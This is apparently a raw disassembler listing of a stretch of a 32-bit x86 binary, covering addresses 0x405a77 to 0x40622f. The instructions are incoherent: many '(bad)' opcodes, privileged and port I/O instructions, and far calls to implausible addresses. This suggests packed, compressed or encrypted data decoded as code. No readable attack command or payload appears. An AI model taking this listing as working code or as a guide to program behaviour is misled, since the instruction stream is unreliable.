  405a77:	dec    BYTE PTR [ebp+ebx*2+0x29]
  405a7b:	jmp    0x77:0xebda9066
  405a82:	jle    0x405ae2
  405a84:	ds jns 0x405a1d
  405a87:	jb     0x405a0d
  405a89:	cmp    DWORD PTR [eax+edx*2],ebp
  405a8c:	repz mov ebp,0x9b1fbec
  405a92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a93:	js     0x405a31
  405a95:	ins    DWORD PTR es:[edi],dx
  405a96:	mov    dl,0x38
  405a98:	mov    ch,0xba
  405a9a:	pop    ecx
  405a9b:	dec    ecx
  405a9c:	imul   eax,esp,0x26
  405a9f:	(bad)  
  405aa1:	test   eax,0xac95254
  405aa6:	lods   eax,DWORD PTR ds:[esi]
  405aa7:	sub    DWORD PTR [edi+ecx*4],edi
  405aaa:	test   BYTE PTR [edi-0x4],dh
  405aad:	mov    ah,0x5b
  405aaf:	cmp    al,0xbb
  405ab1:	mov    DWORD PTR [ebx+0x9],eax
  405ab4:	push   0xffffffea
  405ab6:	stos   DWORD PTR es:[edi],eax
  405ab7:	jle    0x405abb
  405ab9:	repz bnd ja 0x405aef
  405abd:	adc    al,0xd
  405abf:	cmp    al,0xc4
  405ac1:	and    al,0xc3
  405ac3:	and    DWORD PTR [eax+esi*8+0x1e428cb1],0xffffffe6
  405acb:	adc    bh,ch
  405acd:	lock sbb DWORD PTR fs:[ebx-0x79],edi
  405ad2:	pop    edx
  405ad3:	jp     0x405b09
  405ad5:	std    
  405ad6:	fcmovu st,st(3)
  405ad8:	mov    dl,0x75
  405ada:	mov    dl,0x2b
  405adc:	call   0x81448b5
  405ae1:	rcl    DWORD PTR [ecx],cl
  405ae3:	aam    0x6c
  405ae5:	sub    al,0x41
  405ae7:	shl    esi,1
  405ae9:	inc    esp
  405aea:	inc    edx
  405aeb:	enter  0x99ed,0x9a
  405aef:	adc    esi,DWORD PTR [edi]
  405af1:	sbb    al,0xf7
  405af3:	mov    ah,0x4c
  405af5:	xor    dh,ch
  405af7:	sbb    al,0xc8
  405af9:	xchg   edi,eax
  405afa:	test   eax,0x54a20ffa
  405aff:	(bad)  
  405b00:	pusha  
  405b01:	xlat   BYTE PTR ds:[ebx]
  405b03:	pop    esi
  405b04:	sbb    dl,bl
  405b06:	js     0x405abb
  405b08:	imul   ebx,DWORD PTR [eax+0xaaefeb0],0xe01372bb
  405b12:	xchg   DWORD PTR es:[ecx+ebx*2],esp
  405b16:	push   esi
  405b17:	push   ecx
  405b18:	sahf   
  405b19:	add    eax,0xe1da9acb
  405b1e:	inc    ecx
  405b1f:	in     eax,dx
  405b20:	jg     0x405b23
  405b22:	xor    eax,0x53ce4354
  405b27:	popa   
  405b28:	xchg   edx,eax
  405b29:	std    
  405b2a:	xor    al,0x4
  405b2c:	sar    DWORD PTR [edi],cl
  405b2e:	mov    ecx,0x2d1f12c1
  405b33:	inc    ebp
  405b34:	mov    dl,0xb5
  405b36:	xor    ecx,ecx
  405b38:	icebp  
  405b39:	jbe    0x405b65
  405b3b:	add    al,0xc9
  405b3d:	inc    edi
  405b3e:	push   ss
  405b3f:	jp     0x405b55
  405b41:	fcmovu st,st(7)
  405b43:	ja     0x405b8a
  405b45:	push   esi
  405b46:	in     eax,0x3d
  405b48:	xchg   esp,eax
  405b49:	mov    ch,0x7c
  405b4b:	out    dx,al
  405b4c:	data16 jns 0x405b86
  405b4f:	jecxz  0x405b84
  405b51:	in     eax,0x8f
  405b53:	push   ebx
  405b54:	nop
  405b55:	add    eax,eax
  405b57:	setle  BYTE PTR [edx]
  405b5a:	sub    esp,esp
  405b5c:	adc    ch,ch
  405b5e:	add    WORD PTR [esi-0x45d19e07],bp
  405b65:	les    esp,FWORD PTR [edi]
  405b67:	xor    al,0x10
  405b69:	fdivr  DWORD PTR [ecx]
  405b6b:	in     eax,dx
  405b6c:	push   ecx
  405b6d:	push   esp
  405b6e:	cs fsubr st,st(4)
  405b71:	push   eax
  405b72:	jbe    0x405b6a
  405b74:	out    dx,eax
  405b75:	sbb    eax,DWORD PTR [edi+0x4b58ee94]
  405b7b:	and    eax,0xeb2549a
  405b80:	mov    dh,0x89
  405b82:	pop    edi
  405b83:	stos   DWORD PTR es:[edi],eax
  405b84:	mov    eax,DWORD PTR [esi-0x4f]
  405b87:	(bad)
  405b8a:	xor    BYTE PTR [ebp+0x4a],dl
  405b8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b8e:	hlt    
  405b8f:	mov    ebx,0xa187fc71
  405b94:	mov    ebx,0x7a1e6b89
  405b99:	pop    ecx
  405b9a:	add    eax,0x27ce9221
  405b9f:	jecxz  0x405b5b
  405ba1:	aaa    
  405ba2:	fisttp QWORD PTR [eax]
  405ba4:	jbe    0x405c0e
  405ba6:	imul   ebx,DWORD PTR [esi+0x36],0x3a
  405baa:	into   
  405bab:	leave  
  405bac:	add    edx,eax
  405bae:	add    DWORD PTR [edx-0xd9eee5f],edx
  405bb4:	stos   BYTE PTR es:[edi],al
  405bb5:	jg     0x405b8b
  405bb7:	mov    ch,BYTE PTR [edx+edx*1-0x26a6a2b6]
  405bbe:	mov    ecx,0xe6dcc97c
  405bc3:	shl    DWORD PTR [edi-0x3e904914],cl
  405bc9:	jmp    0x405bf6
  405bcb:	in     eax,0x3d
  405bcd:	mov    esp,0xf94f9c1c
  405bd2:	out    0x71,eax
  405bd4:	dec    edx
  405bd5:	inc    esp
  405bd6:	sti    
  405bd7:	nop
  405bd8:	fidiv  WORD PTR [esi-0x62]
  405bdb:	push   esp
  405bdc:	sub    al,0x1a
  405bde:	sbb    eax,0x5a55dd6a
  405be3:	push   ebp
  405be4:	sub    BYTE PTR [eax+0x729f45cf],0x99
  405beb:	data16 out 0xc5,al
  405bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bef:	dec    ebx
  405bf0:	mov    eax,ds:0xf1e0ffe4
  405bf5:	and    dh,BYTE PTR [edx+0x16]
  405bf8:	mov    ds:0x1ef1d923,eax
  405bfd:	call   0xe450:0xee3b5ba5
  405c04:	xor    dh,al
  405c06:	push   eax
  405c07:	sbb    al,0x77
  405c09:	test   eax,0xe37a9d6b
  405c0e:	adc    BYTE PTR [eax+0x3376d856],bl
  405c14:	inc    ebx
  405c15:	mov    ecx,0x9ce56558
  405c1a:	xchg   esp,eax
  405c1b:	int3   
  405c1c:	and    eax,0x2e29ed8f
  405c21:	lods   al,BYTE PTR ds:[esi]
  405c22:	jne    0x405c47
  405c24:	sbb    DWORD PTR [ebx+0x62],edx
  405c27:	jmp    0x405c3b
  405c29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c2a:	and    ebx,edi
  405c2c:	add    BYTE PTR ds:0xb5a98f20,dl
  405c32:	jg     0x405bc1
  405c34:	mov    DWORD PTR [ecx-0x7184e521],0xf1e73074
  405c3e:	in     al,0x6f
  405c40:	call   0x40b3ff83
  405c45:	outs   dx,DWORD PTR ds:[esi]
  405c46:	inc    esi
  405c47:	lods   eax,DWORD PTR ds:[esi]
  405c48:	nop
  405c49:	stos   BYTE PTR es:[edi],al
  405c4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c4b:	mul    BYTE PTR fs:[edx+0x72]
  405c4f:	xchg   edx,eax
  405c50:	push   ebp
  405c51:	in     al,0x13
  405c53:	cmp    DWORD PTR [eax+0x30b40c5a],0x3d28a1b1
  405c5d:	mov    ebp,0xbc6e1e0e
  405c62:	push   edx
  405c63:	sub    BYTE PTR [ebx+0xa4a623d],ah
  405c69:	(bad)  
  405c6a:	mov    al,ds:0xf2ee4b51
  405c6f:	ins    BYTE PTR es:[edi],dx
  405c70:	pop    esi
  405c71:	cmovs  esi,DWORD PTR ss:[ebx-0x76]
  405c76:	inc    edi
  405c77:	repnz mov dh,0xb7
  405c7a:	push   ecx
  405c7b:	pop    ss
  405c7c:	inc    ebx
  405c7d:	fsubrp st(0),st
  405c7f:	call   0x25a1c2db
  405c84:	mov    ds:0x189236b6,al
  405c89:	push   ds
  405c8a:	inc    ebp
  405c8b:	mov    ebp,0x8abf10a6
  405c90:	in     eax,dx
  405c91:	xchg   ebp,eax
  405c92:	mov    ebx,0x1eca7d78
  405c97:	add    al,0xdf
  405c99:	ds jmp 0x3231901
  405c9f:	cmp    al,0x59
  405ca1:	jge    0x405d07
  405ca3:	push   eax
  405ca4:	daa    
  405ca5:	mov    eax,0xf4fb6574
  405caa:	popa   
  405cab:	mov    dl,0x7a
  405cad:	lock sub DWORD PTR [edx+0x4a],ecx
  405cb1:	fild   DWORD PTR [edx+0x6ff33fd7]
  405cb7:	sahf   
  405cb8:	clc    
  405cb9:	xchg   BYTE PTR [ebp+0x24ba86aa],dh
  405cbf:	add    bl,bl
  405cc1:	sub    edi,DWORD PTR [edi+edx*8-0x2ae4b7b3]
  405cc8:	mov    cl,0x18
  405cca:	daa    
  405ccb:	out    0xcf,eax
  405ccd:	inc    ebp
  405cce:	push   ebx
  405ccf:	dec    esp
  405cd0:	xor    DWORD PTR [edi+esi*8-0x6],eax
  405cd4:	add    bl,dh
  405cd6:	cmp    eax,0xbb36ea32
  405cdb:	xchg   BYTE PTR [ebx+0x46],ah
  405cde:	fwait
  405cdf:	pop    esi
  405ce0:	out    dx,eax
  405ce1:	je     0x405caf
  405ce3:	rep lods eax,DWORD PTR ds:[esi]
  405ce5:	sub    al,0x95
  405ce7:	ja     0x405d42
  405ce9:	ret    
  405cea:	pop    esp
  405ceb:	iret   
  405cec:	push   esi
  405ced:	ret    
  405cee:	jmp    0xc3190606
  405cf3:	and    al,0x2e
  405cf6:	inc    ecx
  405cf7:	arpl   WORD PTR [ecx+0x6f],bx
  405cfa:	in     al,dx
  405cfb:	daa    
  405cfc:	jae    0x405ce6
  405cfe:	sub    edx,DWORD PTR [esi+edi*2]
  405d01:	cs xchg edi,eax
  405d03:	fwait
  405d04:	jne    0x405d83
  405d06:	ins    DWORD PTR es:[edi],dx
  405d07:	aam    0x90
  405d09:	ds pop ebp
  405d0b:	mov    esi,es
  405d0d:	dec    edi
  405d0e:	out    0x73,eax
  405d10:	shl    DWORD PTR [eax-0x3b67edb],1
  405d16:	call   0xc073:0xdff6a83
  405d1d:	aaa    
  405d1e:	loope  0x405ce8
  405d20:	cmp    al,0xcc
  405d22:	(bad)  
  405d23:	push   esp
  405d24:	mov    DWORD PTR [edi],esi
  405d26:	xor    ecx,ebp
  405d28:	aad    0xca
  405d2a:	sub    esp,DWORD PTR [esi+ebp*2+0x268e7e3d]
  405d31:	arpl   WORD PTR [ebx],bp
  405d33:	dec    eax
  405d34:	cdq    
  405d35:	call   0xe98e:0x77eebb0
  405d3c:	push   ecx
  405d3d:	(bad)  
  405d3e:	fstp   TBYTE PTR [edi]
  405d40:	pop    esp
  405d41:	aad    0x79
  405d43:	jbe    0x405cd5
  405d45:	icebp  
  405d46:	xchg   ebx,eax
  405d47:	push   eax
  405d48:	mov    al,0xfa
  405d4a:	bound  edi,QWORD PTR [ebx+0x60a31c6a]
  405d50:	stos   BYTE PTR es:[edi],al
  405d51:	call   0x753dfce6
  405d56:	sbb    DWORD PTR [esi+edx*1],esi
  405d59:	xchg   ah,cl
  405d5b:	loopne 0x405d46
  405d5d:	cld    
  405d5e:	mov    ebp,0xf6883d6c
  405d63:	rcr    DWORD PTR [edx*8+0x40aaaa9d],0x66
  405d6b:	adc    DWORD PTR [edi-0x742fbdc1],esp
  405d71:	mov    al,ds:0x66876fbb
  405d76:	push   0x82ea6e5a
  405d7b:	les    ebp,FWORD PTR [eax-0x67]
  405d7e:	and    DWORD PTR [esi],edx
  405d80:	test   al,0xb7
  405d82:	sub    DWORD PTR ds:0x3c0bac9b,esp
  405d88:	push   ss
  405d89:	sar    BYTE PTR [edx],0xcb
  405d8c:	cmp    al,0xcc
  405d8e:	jbe    0x405d32
  405d90:	ja     0x405d5b
  405d92:	push   ds
  405d93:	sahf   
  405d94:	adc    ecx,DWORD PTR [esi+0x3]
  405d97:	push   0x6e0ce0e1
  405d9c:	ds push dx
  405d9f:	mov    edx,0x52d5f922
  405da4:	cmp    dh,ch
  405da6:	out    dx,eax
  405da7:	xor    eax,0x4aa5c7a2
  405dac:	or     ch,ah
  405dae:	add    al,0x33
  405db0:	mov    al,0xca
  405db2:	shl    DWORD PTR [ecx+ecx*1+0x1],0x5f
  405db7:	hlt    
  405db8:	frstor fs:[edx-0x6037db0a]
  405dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dc0:	lods   al,BYTE PTR ds:[esi]
  405dc1:	pop    edi
  405dc2:	inc    ebx
  405dc3:	dec    edi
  405dc4:	and    esp,esi
  405dc6:	sub    BYTE PTR [eax],bh
  405dc8:	popa   
  405dc9:	fwait
  405dca:	not    BYTE PTR [ebp-0x58]
  405dcd:	pop    esp
  405dce:	xlat   BYTE PTR ds:[ebx]
  405dcf:	pusha  
  405dd0:	loop   0x405e1e
  405dd2:	test   DWORD PTR ds:0x4ad104ae,edx
  405dd8:	daa    
  405dd9:	call   0x6ba00b74
  405dde:	inc    esi
  405ddf:	sub    ch,cl
  405de1:	push   edi
  405de2:	loop   0x405dce
  405de4:	inc    eax
  405de5:	jb     0x405e10
  405de7:	lock sub eax,0x2f8d6769
  405ded:	test   dh,bh
  405def:	sub    DWORD PTR ds:0x70f9d43c,0x644cf78c
  405df9:	cmp    BYTE PTR [edi-0x5a26bf35],dl
  405dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e00:	out    0x26,al
  405e02:	mov    BYTE PTR [edi+edx*1],dl
  405e05:	dec    ebx
  405e06:	stc    
  405e07:	call   0x765a:0x2d7ab7a1
  405e0e:	inc    eax
  405e0f:	mov    al,0x81
  405e11:	jae    0x405e6a
  405e13:	sbb    eax,DWORD PTR [eax]
  405e15:	adc    dl,dh
  405e17:	jae    0x405e2f
  405e19:	pop    edi
  405e1a:	in     al,0x5a
  405e1c:	out    0x9e,eax
  405e1e:	mul    BYTE PTR [ecx]
  405e20:	jns    0x405dff
  405e22:	(bad)  
  405e23:	lods   al,BYTE PTR ds:[esi]
  405e24:	cmp    edi,DWORD PTR [edx+edi*2+0x5fcb8c7b]
  405e2b:	jp     0x405dba
  405e2d:	outs   dx,DWORD PTR ds:[esi]
  405e2f:	sar    DWORD PTR [edx-0x6a],1
  405e32:	xchg   DWORD PTR ss:[ebx+0x4],eax
  405e36:	test   DWORD PTR [edi-0x4a],0xf17fdf3a
  405e3d:	xor    al,0x0
  405e3f:	js     0x405de2
  405e41:	mov    eax,0x2f4425a
  405e46:	rcl    BYTE PTR [ebp-0x18],cl
  405e49:	xchg   DWORD PTR [edi],edi
  405e4b:	dec    eax
  405e4c:	xchg   ebx,eax
  405e4d:	nop
  405e4e:	test   BYTE PTR [eax-0x59],ch
  405e51:	fisub  DWORD PTR [eax-0xf1f8e5]
  405e57:	rcl    BYTE PTR [eax-0x2e],1
  405e5a:	mov    ecx,0x20b5c810
  405e5f:	cmc    
  405e60:	push   ss
  405e61:	push   0x8ec355f2
  405e66:	dec    eax
  405e67:	movhps QWORD PTR [ebx+0x5c566bc8],xmm6
  405e6e:	inc    eax
  405e6f:	repnz fild WORD PTR gs:[ebx+0x77cc007b]
  405e77:	mov    gs:0x3e52cc41,al
  405e7d:	sbb    al,0xc7
  405e7f:	dec    sp
  405e81:	out    0x25,eax
  405e83:	popf   
  405e84:	or     eax,DWORD PTR [esp+ebp*4]
  405e87:	jbe    0x405e78
  405e89:	sbb    BYTE PTR [esi-0x34],ah
  405e8c:	fsubr  QWORD PTR [edx+0x429af7d3]
  405e92:	aam    0x58
  405e94:	adc    ah,BYTE PTR [ecx+0x6e51d755]
  405e9a:	dec    ebx
  405e9b:	xlat   BYTE PTR ds:[ebx]
  405e9c:	dec    ebx
  405e9d:	xor    eax,0xd69ab3f8
  405ea2:	xor    cl,BYTE PTR [eax]
  405ea4:	int    0x13
  405ea6:	sbb    BYTE PTR [ebx-0x49],dl
  405ea9:	pop    edi
  405eaa:	adc    DWORD PTR [eax],eax
  405eac:	test   edx,0xaad21e84
  405eb2:	bswap  ebp
  405eb4:	or     DWORD PTR [ecx-0xb],ebx
  405eb7:	loopne 0x405edf
  405eb9:	sub    eax,DWORD PTR [ecx]
  405ebb:	loop   0x405eef
  405ebd:	and    dl,0xf2
  405ec0:	jne    0x405ea2
  405ec2:	ss pop esi
  405ec4:	loop   0x405eab
  405ec6:	pop    ebp
  405ec7:	push   0xb1f8e656
  405ecc:	dec    ebp
  405ecd:	sti    
  405ece:	fwait
  405ecf:	pop    esi
  405ed0:	sar    ecx,1
  405ed2:	sub    eax,0x6c0d46a0
  405ed7:	jns    0x405e8c
  405ed9:	dec    edx
  405eda:	push   esi
  405edb:	pop    ebx
  405edc:	cmp    BYTE PTR [eax-0x77],cl
  405edf:	sub    esi,DWORD PTR [ebp-0x2a]
  405ee2:	inc    ebp
  405ee3:	(bad)  
  405ee4:	jle    0x405ee2
  405ee6:	(bad)  
  405ee7:	in     al,0xba
  405ee9:	push   eax
  405eea:	icebp  
  405eeb:	sbb    al,0x8d
  405eed:	mov    al,ds:0x3561a47b
  405ef2:	scas   al,BYTE PTR es:[edi]
  405ef3:	xchg   DWORD PTR [edi+0x1e],esi
  405ef6:	mov    edx,0x9bae8da8
  405efb:	ret    0xc614
  405efe:	nop
  405eff:	or     bh,dh
  405f01:	pop    ebx
  405f02:	push   edx
  405f03:	dec    esp
  405f04:	mov    al,0xd1
  405f06:	mov    bl,0x7b
  405f08:	inc    esi
  405f09:	mov    al,0x2a
  405f0b:	pop    ecx
  405f0c:	adc    bl,BYTE PTR [esp+ecx*8]
  405f0f:	nop
  405f10:	shl    DWORD PTR ds:0xf9947653,0x38
  405f17:	mov    dh,0x4a
  405f19:	add    DWORD PTR [esi-0x67],edi
  405f1c:	mov    al,0x4a
  405f1e:	inc    ebp
  405f1f:	inc    ebx
  405f20:	inc    esi
  405f21:	or     al,0x62
  405f23:	popf   
  405f24:	jp     0x405f8f
  405f26:	xchg   esp,eax
  405f27:	iret   
  405f28:	sbb    al,0xcd
  405f2a:	push   0x76
  405f2c:	push   ds
  405f2d:	ret    0x64bc
  405f30:	pop    eax
  405f31:	inc    edx
  405f32:	aaa    
  405f33:	pop    ebx
  405f34:	data16 or BYTE PTR [ecx+edx*4],0x6e
  405f39:	das    
  405f3a:	(bad)  
  405f3b:	xchg   ebp,eax
  405f3c:	dec    ebp
  405f3d:	sub    BYTE PTR [edx+0xcec0cc4],cl
  405f43:	inc    eax
  405f44:	retf   
  405f45:	daa    
  405f46:	or     eax,DWORD PTR [edi-0x7ecd7484]
  405f4c:	dec    esi
  405f4d:	xlat   BYTE PTR ds:[ebx]
  405f4e:	lds    esp,FWORD PTR [ecx]
  405f50:	cmp    eax,0x2dc0d24d
  405f55:	mov    dl,0xbe
  405f57:	leave  
  405f58:	es xchg ebp,eax
  405f5a:	ins    DWORD PTR es:[edi],dx
  405f5b:	lock xlat BYTE PTR ds:[ebx]
  405f5d:	push   cs
  405f5e:	outs   dx,DWORD PTR ds:[esi]
  405f5f:	vmovddup xmm4,QWORD PTR [edx+0x274a92e8]
  405f67:	aas    
  405f68:	mov    ebp,0x62cf8e7
  405f6d:	int    0x94
  405f6f:	mov    esp,0x16063783
  405f74:	clc    
  405f75:	adc    ebx,DWORD PTR [ecx+eax*2]
  405f78:	call   0xca58:0x8a43a06f
  405f7f:	add    eax,0x1bc5b66a
  405f84:	test   esp,ebp
  405f86:	or     esp,eax
  405f88:	aam    0x4d
  405f8a:	aad    0x51
  405f8c:	xchg   edx,eax
  405f8d:	inc    ebx
  405f8e:	sbb    BYTE PTR [ecx-0x48b0aeb7],0xb
  405f95:	int3   
  405f96:	addr16 inc edx
  405f98:	jb     0x405f3c
  405f9a:	pop    edi
  405f9b:	inc    ebp
  405f9c:	add    ebx,edi
  405f9e:	imul   edi,DWORD PTR [ecx+0x4a],0xffffffad
  405fa2:	sahf   
  405fa3:	cwde   
  405fa4:	mov    bl,0xdd
  405fa6:	add    ebx,DWORD PTR [edi+0x70]
  405fa9:	push   eax
  405faa:	call   0x2721e4d0
  405faf:	retf   0x5eac
  405fb2:	div    BYTE PTR [edx-0x231a1c69]
  405fb8:	fnstenv [eax+0x3]
  405fbb:	sbb    ebp,edi
  405fbd:	les    ebx,FWORD PTR [eax+0x50]
  405fc0:	es xchg esi,eax
  405fc2:	test   eax,0xf4295a8a
  405fc7:	mov    esp,0x3e9dc7a5
  405fcc:	outs   dx,DWORD PTR ds:[esi]
  405fcd:	fwait
  405fce:	xor    dh,0x84
  405fd1:	std    
  405fd2:	or     esi,esp
  405fd4:	call   0x9b044362
  405fd9:	xchg   ebp,eax
  405fda:	adc    ecx,edi
  405fdc:	outs   dx,BYTE PTR ds:[esi]
  405fdd:	rol    DWORD PTR [edi],0x2
  405fe0:	xor    dl,BYTE PTR [ecx]
  405fe2:	lock mov ecx,0x206c58e4
  405fe8:	sub    esp,DWORD PTR [edx+0x1c]
  405feb:	xor    al,0x8f
  405fed:	sub    eax,0xfd6fd293
  405ff2:	mov    ebp,ebx
  405ff4:	push   esi
  405ff5:	sub    dh,BYTE PTR [eax+0x74]
  405ff8:	dec    DWORD PTR [esi]
  405ffa:	jo     0x40601c
  405ffc:	out    0x53,eax
  405ffe:	aas    
  405fff:	and    esp,ebp
  406001:	jmp    0x405fc1
  406003:	int    0x8f
  406005:	adc    dl,bh
  406007:	bound  ecx,QWORD PTR [ebx]
  406009:	mul    BYTE PTR [ebp+0xd19d1fb]
  40600f:	sbb    DWORD PTR [ecx+0x15],0xffffffef
  406013:	jbe    0x40601d
  406015:	ftst   
  406017:	data16 daa 
  406019:	test   eax,0xd50a2a55
  40601e:	inc    edi
  40601f:	fbld   TBYTE PTR [esi-0x1b]
  406022:	mov    edi,0x8201eb31
  406027:	test   al,0xea
  406029:	and    al,0x26
  40602b:	and    bh,bh
  40602d:	pop    eax
  40602e:	das    
  40602f:	lock ja 0x405ff2
  406032:	aas    
  406033:	popf   
  406034:	inc    ebp
  406035:	hlt    
  406036:	adc    eax,0xd2bfc7bd
  40603b:	fs mov ebx,0xdb679e6b
  406041:	mov    dh,0x40
  406043:	(bad)  
  406045:	in     eax,0x64
  406047:	bound  edi,QWORD PTR [ebx+edi*4]
  40604a:	es clc 
  40604c:	or     BYTE PTR [edx-0x5321482c],0x33
  406053:	xchg   ebp,eax
  406054:	pushf  
  406055:	fs scas eax,DWORD PTR es:[edi]
  406057:	sub    DWORD PTR [ecx+0x54],ebp
  40605a:	(bad)  
  40605c:	jns    0x405ff3
  40605e:	cdq    
  40605f:	lods   al,BYTE PTR ds:[esi]
  406060:	sbb    BYTE PTR [edi+0x1dc63c6],bl
  406066:	je     0x405ffb
  406068:	fwait
  406069:	jae    0x4060c1
  40606b:	add    al,0xf9
  40606d:	xor    BYTE PTR [ebx],dh
  40606f:	(bad)  
  406070:	mov    dl,0xb9
  406072:	int3   
  406073:	aam    0x69
  406075:	jge    0x4060e2
  406077:	mov    eax,0xb39ddf08
  40607c:	push   esp
  40607d:	sbb    eax,ebp
  40607f:	lock int3 
  406081:	or     al,0xbf
  406083:	jl     0x40603b
  406085:	or     eax,0xb2c0fbd
  40608a:	push   esp
  40608b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40608c:	push   edi
  40608d:	test   DWORD PTR [eax],esp
  40608f:	mov    BYTE PTR [eax],ch
  406091:	aaa    
  406092:	push   0xd9617614
  406097:	repnz inc edi
  406099:	test   BYTE PTR [esi+0x3d8cc72],al
  40609f:	dec    ecx
  4060a0:	je     0x4060e8
  4060a2:	add    eax,0xb9487c36
  4060a7:	cs mov edi,0xbebeaa6f
  4060ad:	mov    esp,0xfcd9de59
  4060b2:	jo     0x40605a
  4060b4:	int3   
  4060b5:	daa    
  4060b6:	hlt    
  4060b7:	sub    eax,DWORD PTR [esi-0x1b]
  4060ba:	packuswb mm2,QWORD PTR [edx]
  4060bd:	jbe    0x4060f0
  4060bf:	adc    bh,BYTE PTR ds:0xa8bccd3c
  4060c5:	rcr    DWORD PTR [ebp-0x5],1
  4060c8:	fcmovnu st,st(0)
  4060ca:	inc    edx
  4060cb:	inc    esp
  4060cc:	cmc    
  4060cd:	mov    esp,0x7a092060
  4060d2:	shl    DWORD PTR [edi+0x72],0x5f
  4060d6:	push   esp
  4060d7:	lea    ecx,[eax]
  4060d9:	pop    edi
  4060da:	dec    esp
  4060db:	(bad)  
  4060dc:	xor    bl,BYTE PTR [ecx+ebp*2]
  4060df:	nop
  4060e0:	fcom   QWORD PTR [ebx+0x5e]
  4060e3:	jecxz  0x40607d
  4060e5:	inc    ecx
  4060e6:	sahf   
  4060e7:	mov    ch,BYTE PTR [eax]
  4060e9:	sub    eax,DWORD PTR [edx-0x4b]
  4060ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060ed:	dec    ebx
  4060ee:	cld    
  4060ef:	add    eax,0x44705a34
  4060f4:	pop    ebp
  4060f5:	scas   eax,DWORD PTR es:[edi]
  4060f6:	xchg   esi,eax
  4060f7:	dec    edx
  4060f8:	repz or al,0x18
  4060fb:	mov    WORD PTR [ecx],fs
  4060fd:	jnp    0x4060a3
  4060ff:	adc    ebp,eax
  406101:	fdivr  QWORD PTR gs:[edx]
  406104:	cmc    
  406105:	inc    edx
  406106:	sbb    eax,0x85e54b3a
  40610b:	out    0xbb,eax
  40610d:	cwde   
  40610e:	mov    ah,0x12
  406110:	sub    edi,0x50d5fbb8
  406116:	push   ebx
  406117:	xchg   ecx,eax
  406118:	dec    esp
  406119:	xor    al,0x9a
  40611b:	xor    esi,esp
  40611d:	jb     0x406168
  40611f:	mov    WORD PTR [eax+esi*2],es
  406122:	sub    dl,BYTE PTR ds:0x6eb85d0a
  406128:	(bad)  
  406129:	adc    eax,0xb1b87262
  40612e:	xchg   bh,dh
  406130:	xchg   ebp,eax
  406131:	cmpxchg BYTE PTR ds:0xe7b8db48,cl
  406138:	mov    DWORD PTR [esp+edx*8-0x2e139fff],edi
  40613f:	xchg   edi,eax
  406140:	jb     0x406113
  406142:	enter  0xd7f5,0x33
  406146:	lahf   
  406147:	mov    DWORD PTR [ecx+0x665f66f2],ebx
  40614d:	lahf   
  40614e:	dec    ecx
  40614f:	fidivr DWORD PTR [edi+0x7a]
  406152:	push   edx
  406153:	int    0xfa
  406155:	(bad)  
  406157:	cli    
  406158:	and    eax,DWORD PTR [ecx+eax*8]
  40615b:	daa    
  40615c:	fs scas eax,DWORD PTR es:[edi]
  40615e:	push   es
  40615f:	mov    cl,0x5f
  406161:	cmp    bh,BYTE PTR [ebp+0x1d]
  406164:	xor    DWORD PTR [edx+ebx*8],edx
  406167:	cwde   
  406168:	fld    TBYTE PTR [edi+0x59e4ed3e]
  40616e:	mov    cl,0xc8
  406170:	lods   al,BYTE PTR ds:[esi]
  406171:	push   edx
  406172:	repz retf 
  406174:	pop    ecx
  406175:	adc    DWORD PTR [ebx+0x4e58b14d],0xd40da1a6
  40617f:	pop    esp
  406180:	scas   ax,WORD PTR es:[edi]
  406182:	cmp    eax,0x2c4f6119
  406187:	pop    edx
  406188:	sbb    cl,BYTE PTR [esp+edi*1+0x56fb0b0c]
  40618f:	out    dx,al
  406190:	loop   0x406115
  406192:	cmp    DWORD PTR [esp+ebp*2],edi
  406195:	aam    0xc3
  406197:	mov    WORD PTR [edx+ecx*2+0x102157a9],gs
  40619e:	imul   edi,DWORD PTR [ecx-0x5f],0xffffffa2
  4061a2:	or     ebx,edx
  4061a4:	iret   
  4061a5:	mov    esi,0xaa699e90
  4061aa:	pop    esp
  4061ab:	jbe    0x4061bf
  4061ad:	jle    0x4061d3
  4061af:	and    eax,0xb3acd73a
  4061b4:	push   cs
  4061b5:	in     al,0x1f
  4061b7:	je     0x4061a0
  4061b9:	dec    eax
  4061ba:	push   0xedc7fbfd
  4061bf:	add    bl,BYTE PTR [edi+0x48]
  4061c2:	sbb    esi,DWORD PTR [esi]
  4061c4:	xchg   ebx,eax
  4061c5:	push   ds
  4061c6:	mov    al,0x65
  4061c8:	nop
  4061c9:	add    BYTE PTR [esi+eiz*2+0x11],dl
  4061cd:	push   esi
  4061ce:	test   DWORD PTR [edx-0xd],ebx
  4061d1:	push   ebx
  4061d2:	jmp    0x4061b4
  4061d4:	dec    ebp
  4061d5:	outs   dx,DWORD PTR ds:[esi]
  4061d6:	push   ebx
  4061d7:	inc    ebx
  4061d8:	push   edx
  4061d9:	push   ss
  4061da:	xchg   esp,eax
  4061db:	je     0x4061ba
  4061dd:	mov    ebx,0xa833c468
  4061e2:	pop    edi
  4061e3:	repz add eax,0xffffffc1
  4061e7:	mov    dl,0xd2
  4061e9:	inc    DWORD PTR [esi+0x44]
  4061ec:	and    eax,0x4b59243e
  4061f1:	ins    BYTE PTR es:[edi],dx
  4061f2:	and    ecx,ecx
  4061f4:	sub    edi,DWORD PTR [edx-0x1930b103]
  4061fa:	iret   
  4061fb:	jae    0x40624d
  4061fd:	dec    eax
  4061fe:	mov    BYTE PTR [eax-0x35],ch
  406201:	lds    edi,FWORD PTR [esi-0x1d]
  406204:	test   eax,0x8e1fa681
  406209:	pop    edi
  40620a:	push   0xffffff9c
  40620c:	sub    BYTE PTR [ebp+eiz*4+0x32],bl
  406210:	mov    ds:0x139a4566,eax
  406215:	sbb    al,BYTE PTR [esi+0x583284e6]
  40621b:	aam    0x68
  40621d:	pop    esi
  40621e:	iret   
  40621f:	mov    al,0x1d
  406221:	aas    
  406222:	repnz adc al,0xef
  406225:	and    dl,BYTE PTR [edi+0x1b5c7adf]
  40622b:	rcl    BYTE PTR [edx-0x50],cl
  40622e:	xchg   esp,eax
  40622f:	retf   0xfc79
